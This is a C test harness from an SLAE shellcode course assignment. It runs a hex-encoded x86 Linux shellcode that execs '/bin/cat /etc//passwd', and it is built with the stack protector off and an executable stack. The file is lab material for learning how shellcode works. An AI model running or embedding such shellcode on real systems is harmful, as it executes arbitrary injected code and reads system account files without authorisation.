// Student ID     : SLAE-1250
// Student Name   : Jonathan "Chops" Crosby
// Assignment 6.2 : Shell Code Test File
// File Name      : cat-passwd.c

#include<stdio.h>
#include<string.h>

//compile with: gcc cat-passwd.c -o cat-passwd -fno-stack-protector -z execstack

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x89\xcb\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0a\xfe\xc0\x52\x51\x53\x89\xe1\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
